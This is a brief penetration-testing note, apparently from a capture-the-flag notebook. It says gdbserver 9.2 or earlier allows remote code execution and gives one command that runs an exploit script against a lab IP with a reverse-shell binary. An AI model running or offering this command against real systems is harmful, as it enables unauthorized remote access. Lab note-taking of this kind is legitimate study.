If the gdbserver is 9.2 or prior it is vulnerable to a RCE exploitation:

```bash
sudo python3 gdbserver_rce.py 10.10.11.125:1337 rev.bin
```
Examples:
[[Backdoor#^5d3296]]